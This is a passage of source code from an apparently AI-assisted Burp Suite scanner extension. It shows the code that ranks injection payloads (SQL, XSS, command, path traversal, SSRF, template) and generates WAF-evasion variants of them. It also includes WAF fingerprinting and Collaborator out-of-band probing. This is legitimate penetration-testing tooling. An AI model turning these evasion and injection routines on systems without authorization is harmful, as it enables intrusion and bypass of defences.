            or "\\windows\\" in combined
            or "win.ini" in combined
        ):
            os_hint = "windows"

        cloud_hint = (
            "amazonaws" in combined
            or "x-amz" in combined
            or "metadata.google.internal" in combined
            or "azure" in combined
            or "aliyun" in combined
        )

        is_json = (
            "content-type: application/json" in request_lower
            or "application/json" in response_lower
            or target.endswith(".json")
        )
        is_xml = (
            "application/xml" in request_lower
            or "text/xml" in request_lower
            or "<?xml" in request_lower
        )
        is_graphql = "/graphql" in target.lower() or "graphql" in request_lower
        is_api = "/api/" in target.lower() or is_json or is_graphql
        is_internal_service_target = (
            "127.0.0.1" in combined
            or "localhost" in combined
            or "169.254.169.254" in combined
            or "internal" in combined
        )

        is_attr_context = (
            "=\"" in request_value
            or "='" in request_value
            or " on" in request_lower
            or "href=" in request_lower
        )

        return {
            "method": method,
            "target": target,
            "dbms": dbms,
            "stack": stack,
            "os": os_hint,
            "cloud_hint": bool(cloud_hint),
            "is_json": bool(is_json),
            "is_xml": bool(is_xml),
            "is_graphql": bool(is_graphql),
            "is_api": bool(is_api),
            "is_attr_context": bool(is_attr_context),
            "is_internal_service_target": bool(is_internal_service_target),
            "injection_name": injection_name,
        }

    def _score_payload_candidate(
        self, payload, vuln_family, target_profile=None, waf_profile=None, ai_seed=""
    ):
        target_profile = target_profile or {}
        waf_profile = waf_profile or {}

        value = str(payload or "")
        lowered = value.lower()
        score = 10

        if ai_seed and value == ai_seed:
            score += 120

        if vuln_family == "sqli":
            dbms = str(target_profile.get("dbms", ""))
            if dbms == "mysql" and ("sleep(" in lowered or "benchmark(" in lowered):
                score += 30
            if dbms == "postgresql" and "pg_sleep" in lowered:
                score += 30
            if dbms == "mssql" and "waitfor" in lowered:
                score += 30
            if dbms == "oracle" and ("from dual" in lowered or "utl_" in lowered):
                score += 30
            if dbms == "sqlite" and "sqlite_" in lowered:
                score += 28
            if "union select" in lowered:
                score += 18
            if target_profile.get("is_json") and "\"" in value:
                score += 12
            if any(
                k in str(target_profile.get("injection_name", ""))
                for k in ["id", "sort", "order", "limit", "page", "filter"]
            ):
                score += 15

        if vuln_family == "xss":
            if "<script" in lowered or "onerror" in lowered or "onload" in lowered:
                score += 18
            if target_profile.get("is_json") and (
                "\\u003c" in lowered or "\\x3c" in lowered or "\\\"" in lowered
            ):
                score += 20
            if target_profile.get("is_attr_context") and (
                "autofocus" in lowered or "onfocus" in lowered
            ):
                score += 16

        if vuln_family == "command_injection":
            os_hint = str(target_profile.get("os", "unix"))
            if os_hint == "windows" and (
                "ping -n" in lowered
                or "powershell" in lowered
                or "certutil" in lowered
                or "& " in lowered
            ):
                score += 24
            if os_hint != "windows" and (
                "; " in lowered
                or "&& " in lowered
                or "`" in lowered
                or "$(" in lowered
            ):
                score += 24
            if "{{oob_domain}}" in lowered or "oob.invalid" in lowered:
                score -= 5
            if any(
                k in str(target_profile.get("injection_name", ""))
                for k in ["cmd", "exec", "run", "shell"]
            ):
                score += 16

        if vuln_family == "path_traversal":
            if target_profile.get("os") == "windows" and (
                "win.ini" in lowered or "\\windows\\" in lowered or "%5c" in lowered
            ):
                score += 22
            if target_profile.get("os") != "windows" and (
                "/etc/passwd" in lowered or "/proc/self" in lowered
            ):
                score += 22
            if "%25" in lowered or "%c0%af" in lowered:
                score += 14

        if vuln_family == "ssrf":
            if "169.254.169.254" in lowered or "metadata.google.internal" in lowered:
                score += 20
            if (
                "{{oob_domain}}" in lowered
                or "oob.invalid" in lowered
                or "http://" in lowered
                or "https://" in lowered
            ):
                score += 15
            if any(
                k in str(target_profile.get("injection_name", ""))
                for k in ["url", "uri", "callback", "redirect", "next", "dest", "return"]
            ):
                score += 18
            if target_profile.get("cloud_hint") and "metadata" in lowered:
                score += 16

        if vuln_family == "ssti":
            stack = str(target_profile.get("stack", ""))
            if stack == "jinja2" and "{{" in lowered:
                score += 20
            if stack == "freemarker" and "${" in lowered:
                score += 20
            if stack == "velocity" and "#set(" in lowered:
                score += 20
            if stack == "erb" and "<%=" in lowered:
                score += 20
            if stack == "twig" and "{{" in lowered:
                score += 20

        if waf_profile.get("detected"):
            if (
                "%" in value
                or "/**/" in value
                or "&lt;" in value
                or "${IFS}" in value
                or "\\u003c" in lowered
            ):
                score += 18
            if len(value) > 160:
                score -= 8

        if target_profile.get("method") == "GET" and len(value) > 140:
            score -= 10

        if "\n" in value or "\r" in value:
            score -= 8

        return score

    def _rank_payload_candidates(
        self, candidates, vuln_family, target_profile=None, waf_profile=None, ai_seed=""
    ):
        ranked = []
        idx = 0
        for payload in candidates:
            score = self._score_payload_candidate(
                payload,
                vuln_family,
                target_profile=target_profile,
                waf_profile=waf_profile,
                ai_seed=ai_seed,
            )
            ranked.append((score, -idx, payload))
            idx += 1

        ranked.sort(reverse=True)
        return [item[2] for item in ranked]

    def _generate_payload_candidates(
        self,
        vuln_family,
        ai_payload,
        verification_nonce="",
        waf_profile=None,
        oob_domain="",
        target_profile=None,
    ):
        candidates = [ai_payload]

        if (
            self.ENABLE_WAF_EVASION
            and waf_profile
            and waf_profile.get("detected")
        ):
            candidates.extend(
                self._build_waf_evasion_payloads(ai_payload, vuln_family, waf_profile)
            )

        if self.ENABLE_ADVANCED_PAYLOADS:
            for candidate in self._get_library_payloads_for_family(
                vuln_family, target_profile=target_profile
            ):
                candidate = self._replace_payload_placeholders(
                    candidate, verification_nonce, oob_domain
                )
                candidates.append(candidate)

        if (
            self.ENABLE_WAF_EVASION
            and waf_profile
            and waf_profile.get("detected")
        ):
            waf_evasion_payloads = []
            for base in candidates[1:5]:
                waf_evasion_payloads.extend(
                    self._build_waf_evasion_payloads(base, vuln_family, waf_profile)
                )
            candidates.extend(waf_evasion_payloads)

        decorated = []
        for payload in candidates:
            decorated.append(
                self._decoratePayloadWithNonce(payload, vuln_family, verification_nonce)
            )

        ai_seed = self._decoratePayloadWithNonce(
            ai_payload, vuln_family, verification_nonce
        )
        normalized = self._normalize_payload_candidates(decorated, limit=180)
        ranked = self._rank_payload_candidates(
            normalized,
            vuln_family=vuln_family,
            target_profile=target_profile,
            waf_profile=waf_profile,
            ai_seed=ai_seed,
        )

        max_count = max(1, int(self.MAX_VERIFICATION_ATTEMPTS))
        return ranked[:max_count]

    def _looks_waf_blocked(self, status_code, response_text):
        lowered = str(response_text or "").lower()
        if int(status_code or 0) in [401, 403, 406, 429, 501, 503]:
            if (
                "forbidden" in lowered
                or "blocked" in lowered
                or "malicious" in lowered
                or "access denied" in lowered
                or "waf" in lowered
            ):
                return True

        waf_markers = [
            "request blocked",
            "blocked by waf",
            "mod_security",
            "cloudflare ray id",
            "akamai ghost",
            "sucuri website firewall",
            "malicious input",
            "web application firewall",
        ]
        for marker in waf_markers:
            if marker in lowered:
                return True
        return False

    def _detect_waf_profile(self, messageInfo=None, response_text="", response_headers=None):
        profile = {
            "detected": False,
            "vendor": "",
            "confidence": 0,
            "signals": [],
            "status_code": 0,
        }

        header_text = ""
        body_text = str(response_text or "")
        host = ""

        try:
            if messageInfo:
                req_info = self.helpers.analyzeRequest(messageInfo)
                try:
                    host = str(req_info.getUrl().getHost() or "")
                except:
                    host = ""

                resp = messageInfo.getResponse()
                if resp:
                    resp_info = self.helpers.analyzeResponse(resp)
                    profile["status_code"] = int(resp_info.getStatusCode() or 0)
                    header_text = "\n".join([str(h) for h in resp_info.getHeaders()])
                    if not body_text:
                        try:
                            body_text = self.helpers.bytesToString(
                                resp[resp_info.getBodyOffset() :]
                            )[:4000]
                        except:
                            body_text = ""
        except Exception:
            pass

        if response_headers:
            header_text = "\n".join([str(h) for h in response_headers])

        header_lower = header_text.lower()
        body_lower = body_text.lower()

        signatures = {
            "Cloudflare": ["cf-ray", "cf-cache-status", "cloudflare"],
            "Akamai": ["akamai", "akamai-ghost", "x-akamai"],
            "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awswaf"],
            "F5 BIG-IP ASM": ["x-waf-event", "bigip", "f5"],
            "Imperva": ["incapsula", "imperva", "x-iinfo"],
            "Sucuri": ["x-sucuri-id", "sucuri", "cloudproxy"],
            "ModSecurity": ["mod_security", "modsecurity", "owasp_modsecurity_crs"],
        }

        best_vendor = ""
        best_hits = 0
        signals = []
        for vendor, markers in signatures.items():
            hits = 0
            for marker in markers:
                if marker in header_lower or marker in body_lower:
                    hits += 1
                    signals.append("%s:%s" % (vendor, marker))
            if hits > best_hits:
                best_hits = hits
                best_vendor = vendor

        blocked = self._looks_waf_blocked(profile.get("status_code", 0), body_lower)
        if blocked:
            signals.append("block-page")

        if best_hits > 0 or blocked:
            profile["detected"] = True
            profile["vendor"] = best_vendor or "Generic WAF"
            profile["signals"] = signals[:6]
            profile["confidence"] = min(95, 45 + (best_hits * 18) + (10 if blocked else 0))
            if host:
                self._record_waf_profile(host, profile)

        return profile

    def _record_waf_profile(self, host, profile):
        if not host:
            return

        with self.waf_lock:
            existing = self.waf_profiles.get(host)
            self.waf_profiles[host] = profile
            if (
                profile.get("detected")
                and (not existing or not existing.get("detected"))
            ):
                self.updateStats("waf_detected")

    def _build_waf_evasion_payloads(self, payload, vuln_family, waf_profile=None):
        payload = str(payload or "").strip()
        if not payload:
            return []

        import urllib

        candidates = []
        candidates.append(urllib.quote(payload))
        candidates.append(urllib.quote(urllib.quote(payload)))

        if vuln_family == "sqli":
            candidates.append(payload.replace(" ", "/**/"))
            candidates.append(payload.replace("UNION", "UN/**/ION").replace("SELECT", "SEL/**/ECT"))
            candidates.append(payload.replace(" or ", " oR ").replace(" and ", " aNd "))
        elif vuln_family == "xss":
            candidates.append(
                payload.replace("<", "&lt;").replace(">", "&gt;")
            )
            candidates.append(payload.replace("script", "scr<script>ipt"))
            candidates.append(payload.replace("onerror", "onload"))
        elif vuln_family == "command_injection":
            candidates.append(payload.replace(" ", "${IFS}"))
            candidates.append(payload.replace(";", "%0a"))
            candidates.append(payload.replace("&&", "|"))
        else:
            candidates.append(payload.replace(" ", "%09"))
            candidates.append(payload.replace("/", "%2f"))

        if waf_profile and str(waf_profile.get("vendor", "")).lower().find("cloudflare") >= 0:
            candidates.append(payload.replace("<", "%3C").replace(">", "%3E"))

        return self._normalize_payload_candidates(candidates, limit=8)

    def _pick_injection_point(self, request_info, fallback_header="X-Code-AIxBurp-Verify"):
        if not request_info:
            return fallback_header
        params = request_info.getParameters() or []
        for param in params:
            try:
                param_type = int(param.getType())
            except:
                param_type = -1
            if param_type in [0, 1, 2, 6]:
                name = str(param.getName() or "")
                if name:
                    return name
        return fallback_header

    def _get_or_create_collaborator_context(self, key="default"):
        if not self.ENABLE_OOB_TESTING:
            return None
        with self.collaborator_lock:
            if key in self.collaborator_contexts:
                return self.collaborator_contexts[key]
            try:
                context = self.callbacks.createBurpCollaboratorClientContext()
                if context:
                    self.collaborator_contexts[key] = context
                return context
            except Exception as e:
                self.stderr.println("[!] Burp Collaborator unavailable: %s" % str(e))
                return None

    def _generate_oob_payload(self, collaborator_context):
        if not collaborator_context:
            return ""
        try:
            return str(collaborator_context.generatePayload(True))
        except Exception:
            try:
                return str(collaborator_context.generatePayload())
            except Exception:
                return ""

    def _interaction_properties_to_dict(self, interaction):
        props = {}
        try:
            raw_props = interaction.getProperties()
            if raw_props:
                for entry in raw_props.entrySet():
                    key = str(entry.getKey())
                    val = str(entry.getValue())
                    props[key] = val
        except Exception:
            pass
        return props

    def _collect_collaborator_ids(self, collaborator_context):
        ids = set()
        if not collaborator_context:
            return ids
        try:
            interactions = collaborator_context.fetchAllCollaboratorInteractions() or []
            for interaction in interactions:
                props = self._interaction_properties_to_dict(interaction)
                marker = (
                    props.get("interaction_id")
                    or props.get("request_id")
                    or props.get("time_stamp")
                    or str(len(ids))
                )
                ids.add(str(marker))
        except Exception:
            pass
        return ids

    def _run_oob_probe_for_message(
        self,
        messageInfo,
        injection_point="",
        context_label="Verification",
        poll_seconds=None,
    ):
        result = {"sent": False, "detected": False, "payload": "", "evidence": ""}
        if not messageInfo or not self.ENABLE_OOB_TESTING:
            return result

        request_info = self.helpers.analyzeRequest(messageInfo)
        host = ""
        try:
            host = str(request_info.getUrl().getHost() or "default")
        except:
            host = "default"

        collab_context = self._get_or_create_collaborator_context(host)
        if not collab_context:
            self.stdout.println("[OOB] Collaborator context unavailable for %s" % host)
            return result

        oob_payload = self._generate_oob_payload(collab_context)
        if not oob_payload:
            self.stdout.println("[OOB] Failed to generate collaborator payload")
            return result

        request_str = self.helpers.bytesToString(messageInfo.getRequest())
        if not injection_point:
            injection_point = self._pick_injection_point(
                request_info, fallback_header="X-Code-AIxBurp-OOB"
            )

        modified_request = self._injectPayload(request_str, oob_payload, injection_point)
        if not modified_request:
            injection_point = "X-Code-AIxBurp-OOB"
            modified_request = self._injectPayload(request_str, oob_payload, injection_point)

        if not modified_request:
            self.stdout.println(
                "[OOB] Could not inject collaborator payload for %s"
                % str(request_info.getUrl())
            )
            return result

        baseline_ids = self._collect_collaborator_ids(collab_context)
        self.callbacks.makeHttpRequest(
            messageInfo.getHttpService(), self.helpers.stringToBytes(modified_request)
        )

        token = oob_payload.split(".")[0].lower()
        timeout_s = int(poll_seconds or self.OOB_POLL_SECONDS or 18)
        started = time.time()
        found = None

        while time.time() - started < timeout_s:
            time.sleep(3)
            try:
                interactions = collab_context.fetchAllCollaboratorInteractions() or []
            except Exception:
                interactions = []

            for interaction in interactions:
                props = self._interaction_properties_to_dict(interaction)
                marker = (
                    props.get("interaction_id")
                    or props.get("request_id")
                    or props.get("time_stamp")
                    or ""
                )
                marker = str(marker)
                if marker and marker in baseline_ids:
                    continue

                blob = " ".join([str(v).lower() for v in props.values()])
                if token and token in blob:
                    found = props
                    break
            if found:
                break

        result["sent"] = True
        result["payload"] = oob_payload

        if found:
            proto = found.get("protocol", found.get("query_type", "dns"))
            client_ip = found.get("client_ip", "unknown")
            evidence = "%s interaction from %s via %s" % (
                context_label,
                client_ip,
                proto,
            )
            result["detected"] = True
            result["evidence"] = evidence
            self.updateStats("oob_interactions")
            self.stdout.println("[OOB] Interaction observed: %s" % evidence)
        else:
            result["evidence"] = "No collaborator interaction in %ds" % timeout_s
            self.stdout.println("[OOB] No interaction observed in %ds" % timeout_s)

        return result

    def _sync_intruder_payload_factory(self):
        try:
            if self.ENABLE_INTRUDER_AUTOMATION and not self.intruder_payload_factory_registered:
                self.callbacks.registerIntruderPayloadGeneratorFactory(self)
                self.intruder_payload_factory_registered = True
                self.stdout.println("[INTRUDER] Payload generator registered")
            elif (
                not self.ENABLE_INTRUDER_AUTOMATION
                and self.intruder_payload_factory_registered
            ):
                if hasattr(self.callbacks, "removeIntruderPayloadGeneratorFactory"):
                    self.callbacks.removeIntruderPayloadGeneratorFactory(self)
                self.intruder_payload_factory_registered = False
                self.stdout.println("[INTRUDER] Payload generator unregistered")
        except Exception as e:
            self.stderr.println("[!] Intruder factory sync failed: %s" % str(e))

    def get_intruder_payloads(self):
        payloads = []
        families = [
            "sqli",
            "xss",
            "command_injection",
            "path_traversal",
            "ssrf",
            "ssti",
            "generic",
        ]
        oob_domain = ""
        if self.ENABLE_OOB_TESTING:
            context = self._get_or_create_collaborator_context("intruder")
            oob_domain = self._generate_oob_payload(context)

        for family in families:
            for payload in self._get_library_payloads_for_family(family):
                payloads.append(
                    self._replace_payload_placeholders(payload, "intr", oob_domain)
                )

        if self.ENABLE_WAF_EVASION:
            for base in payloads[:10]:
                payloads.extend(self._build_waf_evasion_payloads(base, "generic"))

        return self._normalize_payload_candidates(payloads, limit=240)

    # IIntruderPayloadGeneratorFactory implementation
    def getGeneratorName(self):
        return "Code-AIxBurp - Advanced Payload Library"

    def createNewInstance(self, attack):
        return CodeAIxBurpIntruderPayloadGenerator(self)

    def addTask(self, task_type, url, status="Queued", messageInfo=None):
        with self.tasks_lock:
            task = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": task_type,
                "url": url,
                "status": status,
                "start_time": time.time(),
                "messageInfo": messageInfo,
            }
            self.tasks.append(task)
            with self.stats_lock:
                self.stats["total_requests"] += 1
            self._ui_dirty = True
            return len(self.tasks) - 1

    def updateTask(self, task_id, status, error=None):
        with self.tasks_lock:
            if task_id < len(self.tasks):
                self.tasks[task_id]["status"] = status
                self.tasks[task_id]["end_time"] = time.time()
                if error:
                    self.tasks[task_id]["error"] = error
        self._ui_dirty = True

    def updateStats(self, stat_key, increment=1):
        with self.stats_lock:
            self.stats[stat_key] = self.stats.get(stat_key, 0) + increment
        self._ui_dirty = True

    def getTabCaption(self):
        return "Code-AIxBurp"

    def getUiComponent(self):
        return self.panel

    def createMenuItems(self, invocation):
        menu_list = ArrayList()

        context = invocation.getInvocationContext()
        if context in [
            invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
            invocation.CONTEXT_MESSAGE_VIEWER_REQUEST,
            invocation.CONTEXT_PROXY_HISTORY,
            invocation.CONTEXT_TARGET_SITE_MAP_TABLE,
            invocation.CONTEXT_TARGET_SITE_MAP_TREE,
        ]:
            messages = invocation.getSelectedMessages()
            if messages and len(messages) > 0:
                analyze_item = JMenuItem("Analyze Request")
                analyze_item.addActionListener(
                    lambda x: self.analyzeFromContextMenu(messages)
                )
                menu_list.add(analyze_item)

                intruder_item = JMenuItem(
                    "Automated Fuzzing: Send to Intruder (Advanced Payloads)"
                )
                intruder_item.addActionListener(
                    lambda x: self.send_to_intruder_automated(messages)
                )
                menu_list.add(intruder_item)

                oob_item = JMenuItem("Run OOB Probe (Burp Collaborator)")
                oob_item.addActionListener(lambda x: self.run_oob_probe_context(messages))
                menu_list.add(oob_item)

                waf_item = JMenuItem("Detect WAF From Response")
                waf_item.addActionListener(lambda x: self.detect_waf_from_context(messages))
                menu_list.add(waf_item)

        return menu_list if menu_list.size() > 0 else None

    def analyzeFromContextMenu(self, messages):
        t = threading.Thread(
            target=self._analyzeFromContextMenuThread, args=(messages,)
        )
        t.setDaemon(True)
        t.start()

    def _analyzeFromContextMenuThread(self, messages):
        seen_keys = set()
        unique_messages = []

        for message in messages:
            try:
                req = self.helpers.analyzeRequest(message)
                url_str = str(req.getUrl())

                request_bytes = message.getRequest()
                if request_bytes:
                    import hashlib

                    request_hash = hashlib.md5(request_bytes.tostring()).hexdigest()[:8]
                    unique_key = "%s|%s" % (url_str, request_hash)
                else:
                    unique_key = url_str

                current_time = time.time()
                with self.context_menu_lock:
                    last_invoke_time = self.context_menu_last_invoke.get(unique_key, 0)
                    if (
                        current_time - last_invoke_time
                        < self.context_menu_debounce_time
                    ):
                        if self.VERBOSE:
                            self.stdout.println(
                                "[DEBUG] Debouncing duplicate context menu invoke: %s"
                                % url_str
                            )
                        continue

                    self.context_menu_last_invoke[unique_key] = current_time

                if unique_key not in seen_keys:
                    seen_keys.add(unique_key)
                    unique_messages.append(message)
            except:
                pass

        if len(unique_messages) == 0:
            return

        self.stdout.println(
            "\n[CONTEXT MENU] Analyzing %d unique request(s)..." % len(unique_messages)
        )
        for message in unique_messages:
            try:
                req = self.helpers.analyzeRequest(message)
                url_str = str(req.getUrl())
                self.stdout.println("[CONTEXT MENU] URL: %s" % url_str)

                if message.getResponse() is None:
                    self.stdout.println(
                        "[CONTEXT MENU] No response - sending request..."
                    )

                    try:
                        http_service = message.getHttpService()
                        request_bytes = message.getRequest()

                        response = self.callbacks.makeHttpRequest(
                            http_service, request_bytes
                        )

                        if response is None or response.getResponse() is None:
                            self.stdout.println(
                                "[CONTEXT MENU] ERROR: Failed to get response"
                            )
                            continue

                        message = response

                    except Exception as e:
                        self.stderr.println("[!] Failed to send request: %s" % e)
                        continue

                self.stdout.println("[CONTEXT MENU] Running analysis...")
                task_id = self.addTask("CONTEXT", url_str, "Queued", message)
                # Use special forced analysis that bypasses deduplication
                t = threading.Thread(
                    target=self.analyze_forced, args=(message, url_str, task_id)
                )
                t.setDaemon(True)
                t.start()
            except Exception as e:
                self.stderr.println("[!] Context menu error: %s" % e)

    def send_to_intruder_automated(self, messages):
        if not self.ENABLE_INTRUDER_AUTOMATION:
            self.stdout.println("[INTRUDER] Intruder automation is disabled in Settings")
            return

        t = threading.Thread(
            target=self._send_to_intruder_automated_thread, args=(messages,)
        )
        t.setDaemon(True)
        t.start()

    def _send_to_intruder_automated_thread(self, messages):
        launched = 0
        for message in list(messages)[:10]:
            try:
                http_service = message.getHttpService()
                if not http_service:
                    continue
                request_bytes = message.getRequest()
                if not request_bytes:
                    continue

                request_info = self.helpers.analyzeRequest(message)
                payload_positions = self._derive_intruder_payload_positions(
                    request_info, request_bytes
                )

                host = http_service.getHost()
                port = int(http_service.getPort())
                protocol = str(http_service.getProtocol() or "").lower()
                use_https = protocol == "https"

                if payload_positions and payload_positions.size() > 0:
                    self.callbacks.sendToIntruder(
                        host, port, use_https, request_bytes, payload_positions
                    )
                else:
                    self.callbacks.sendToIntruder(host, port, use_https, request_bytes)

                launched += 1
                self.updateStats("intruder_launches")
                self.stdout.println(
                    "[INTRUDER] Sent to Intruder: %s (positions=%d)"
                    % (str(request_info.getUrl()), payload_positions.size())
                )
            except Exception as e:
                self.stderr.println("[!] Intruder launch failed: %s" % str(e))

        if launched == 0:
            self.stdout.println("[INTRUDER] No eligible requests selected")
        else:
            self.stdout.println("[INTRUDER] Launched %d request(s)" % launched)

    def _derive_intruder_payload_positions(self, request_info, request_bytes):
        positions = ArrayList()
        if not request_info or not request_bytes:
            return positions

        request_text = self.helpers.bytesToString(request_bytes)
        seen_ranges = set()

        params = list(request_info.getParameters() or [])
        for param in params[:12]:
            try:
                start = int(param.getValueStart())
                end = int(param.getValueEnd())
            except Exception:
                start = -1
                end = -1

            if start < 0 or end <= start:
                name = str(param.getName() or "")
                value = str(param.getValue() or "")
                if not name:
                    continue

                if value:
                    marker = "%s=%s" % (name, value)
                    idx = request_text.find(marker)
                    if idx >= 0:
                        start = idx + len(name) + 1
                        end = start + len(value)
                else:
                    marker = name + "="
                    idx = request_text.find(marker)
                    if idx >= 0:
                        start = idx + len(marker)
                        end = start

            if start >= 0 and end >= start:
                key = (start, end)
                if key in seen_ranges:
                    continue
                seen_ranges.add(key)
                positions.add(jarray_array([int(start), int(end)], "i"))

        return positions

    def run_oob_probe_context(self, messages):
        if not self.ENABLE_OOB_TESTING:
            self.stdout.println("[OOB] OOB testing is disabled in Settings")
            return

        t = threading.Thread(target=self._run_oob_probe_context_thread, args=(messages,))
        t.setDaemon(True)
        t.start()

    def _run_oob_probe_context_thread(self, messages):
        triggered = 0
        for message in list(messages)[:5]:
            try:
                result = self._run_oob_probe_for_message(
                    message, context_label="Context Menu"
                )
                if result and result.get("sent"):
                    triggered += 1
            except Exception as e:
                self.stderr.println("[!] OOB context probe error: %s" % str(e))

        if triggered == 0:
            self.stdout.println("[OOB] No OOB probe was sent")
        else:
            self.stdout.println("[OOB] OOB probe completed for %d request(s)" % triggered)

    def detect_waf_from_context(self, messages):
        if not self.ENABLE_WAF_DETECTION:
            self.stdout.println("[WAF] WAF detection is disabled in Settings")
            return

        for message in list(messages)[:10]:
            try:
                req = self.helpers.analyzeRequest(message)
                profile = self._detect_waf_profile(messageInfo=message)
                if profile.get("detected"):
                    self.stdout.println(
                        "[WAF] %s -> %s (confidence=%s)"
                        % (
                            str(req.getUrl()),
                            profile.get("vendor", "Unknown WAF"),
                            str(profile.get("confidence", 0)),
                        )
                    )
                else:
                    self.stdout.println("[WAF] %s -> no WAF fingerprint found" % str(req.getUrl()))
            except Exception as e:
                self.stderr.println("[!] WAF detection error: %s" % str(e))

    def test_ai_connection(self):
        self.stdout.println(
            "\n[AI CONNECTION] Testing connection to %s..." % self.API_URL
        )

        try:
            if self.AI_PROVIDER == "Ollama":
                return self._test_ollama_connection()
            elif self.AI_PROVIDER == "OpenAI":
                return self._test_openai_connection()
            elif self.AI_PROVIDER == "Claude":
                return self._test_claude_connection()
            elif self.AI_PROVIDER == "Gemini":
                return self._test_gemini_connection()
            elif self.AI_PROVIDER == "OpenAI Compatible":
                return self._test_openai_compatible_connection()
            else:
                self.stderr.println("[!] Unknown AI provider: %s" % self.AI_PROVIDER)
                return False
        except Exception as e:
            self.stderr.println("[!] AI connection test failed: %s" % e)
            return False

    def _test_ollama_connection(self):
        try:
            tags_url = self.API_URL.rstrip("/api/generate").rstrip("/") + "/api/tags"

            req = urllib2.Request(tags_url)
            req.add_header("Content-Type", "application/json")

            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())

            if "models" in data:
                self.available_models = [model["name"] for model in data["models"]]
                self.stdout.println("[AI CONNECTION] OK Connected to Ollama")
                self.stdout.println(
                    "[AI CONNECTION] Found %d models" % len(self.available_models)
                )

                if (
                    self.MODEL not in self.available_models
                    and len(self.available_models) > 0
                ):
                    old_model = self.MODEL
                    self.MODEL = self.available_models[0]
                    self.stdout.println(
                        "[AI CONNECTION] Model '%s' not found, using '%s'"
                        % (old_model, self.MODEL)
                    )

                return True
            else:
                self.stderr.println("[!] Unexpected response from Ollama API")
                return False

        except urllib2.URLError as e:
            self.stderr.println(
                "[!] Cannot connect to Ollama at %s: %s" % (self.API_URL, e)
            )
            return False

    def _test_openai_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] OpenAI API key required")
            return False

        try:
            req = urllib2.Request("https://api.openai.com/v1/models")
            req.add_header("Authorization", "Bearer " + self.API_KEY)

            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())

            if "data" in data:
                self.available_models = [
                    model["id"] for model in data["data"] if "gpt" in model["id"]
                ]
                self.stdout.println("[AI CONNECTION] OK Connected to OpenAI")
                return True
            return False
        except Exception as e:
            self.stderr.println("[!] OpenAI connection failed: %s" % e)
            return False

    def _test_claude_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] Claude API key required")
            return False

        self.available_models = [
            "claude-3-5-sonnet-20241022",
            "claude-3-opus-20240229",
            "claude-3-sonnet-20240229",
        ]
        self.stdout.println("[AI CONNECTION] OK Claude API configured")
        return True

    def _test_gemini_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] Gemini API key required")
            return False

        self.available_models = ["gemini-1.5-pro", "gemini-1.5-flash", "gemini-pro"]
        self.stdout.println("[AI CONNECTION] OK Gemini API configured")
        return True

    def _test_openai_compatible_connection(self):
        if not self.API_KEY:
            self.stderr.println("[!] OpenAI Compatible API key required")
            return False

        # Ensure URL is str (bytes) not unicode for Jython compatibility
        base_url = str(self.API_URL.rstrip("/"))
        api_key = str(self.API_KEY)

        # Try to list models first
        try:
            req = urllib2.Request(base_url + "/models")
            req.add_header("Authorization", "Bearer " + api_key)
            req.add_header("HTTP-Referer", "https://code-x.my")
            req.add_header("X-Title", "Code-AIxBurp")

            response = urllib2.urlopen(req, timeout=10)
            data = json.loads(response.read())

            if "data" in data:
                self.available_models = [
                    model["id"] for model in data["data"] if model.get("id")
                ]
                self.stdout.println("[AI CONNECTION] OK Connected to OpenAI Compatible API")
                self.stdout.println("[AI CONNECTION] Found %d models" % len(self.available_models))
                return True
        except Exception as e:
            self.stdout.println("[AI CONNECTION] Model listing not supported: %s" % e)
            self.stdout.println("[AI CONNECTION] Trying connection validation...")

        # Fallback: validate connection with a simple request
        try:
            payload = json.dumps({
                "model": str(self.MODEL),
                "messages": [{"role": "user", "content": "hi"}],
                "max_tokens": 5,
            })
            req = urllib2.Request(base_url + "/chat/completions", data=payload)
            req.add_header("Content-Type", "application/json")
            req.add_header("Authorization", "Bearer " + api_key)
            req.add_header("HTTP-Referer", "https://code-x.my")
            req.add_header("X-Title", "Code-AIxBurp")

            response = urllib2.urlopen(req, timeout=15)
            data = json.loads(response.read())
            if "choices" in data:
                self.stdout.println("[AI CONNECTION] OK Connected to OpenAI Compatible API")
                self.stdout.println("[AI CONNECTION] Model listing not available - enter model name manually")
                return True
            return False
        except Exception as e:
            self.stderr.println("[!] OpenAI Compatible connection failed: %s" % e)
            return False

    def print_logo(self):
        self.stdout.println("")
        self.stdout.println("=" * 65)
        self.stdout.println("")
        self.stdout.println("     Code-AIxBurp")
        self.stdout.println("     ---------------")
        self.stdout.println(
            "     AI-Powered OWASP Top 10 Vulnerability Scanning for Burp Suite"
        )
        self.stdout.println("")
        self.stdout.println("     Intelligent | Silent | Adaptive | Comprehensive")
        self.stdout.println("")
        self.stdout.println("     WAF + Payload Libraries + OOB + Intruder Ready")
        self.stdout.println("     https://code-x.my")
        self.stdout.println("")
        self.stdout.println("=" * 65)
        self.stdout.println("")

    def doPassiveScan(self, baseRequestResponse):
        # Check if passive scanning is enabled
        if not self.PASSIVE_SCANNING_ENABLED:
            return None

        url_str = None
        try:
            req = self.helpers.analyzeRequest(baseRequestResponse)
            url_str = str(req.getUrl())
            if self.VERBOSE:
                self.stdout.println("\n[PASSIVE] URL: %s" % url_str)

            if not self.is_in_scope(url_str):
                if self.VERBOSE:
                    self.stdout.println(
                        "[PASSIVE] URL: %s - [SKIP] Out of scope" % url_str
                    )
                return None

            # Skip static file extensions
            if self.should_skip_extension(url_str):
                return None

        except:
            url_str = "Unknown"

        task_id = self.addTask("PASSIVE", url_str, "Queued", baseRequestResponse)
        t = threading.Thread(
            target=self.analyze, args=(baseRequestResponse, url_str, task_id)
        )
        t.setDaemon(True)
        t.start()
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # Passive-only active scan hook
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return 0

    def is_in_scope(self, url):
        try:
            from java.net import URL as JavaURL

            java_url = JavaURL(url)
            in_scope = self.callbacks.isInScope(java_url)

            if not in_scope:
                if self.VERBOSE:
                    self.stdout.println("[SCOPE] X OUT OF SCOPE: %s" % url)

            return in_scope

        except Exception as e:
            if self.VERBOSE:
                self.stderr.println("[!] Scope check error for %s: %s" % (url, e))
            return False

    def should_skip_extension(self, url):
        """Check if URL has a file extension that should be skipped (static files)"""
        try:
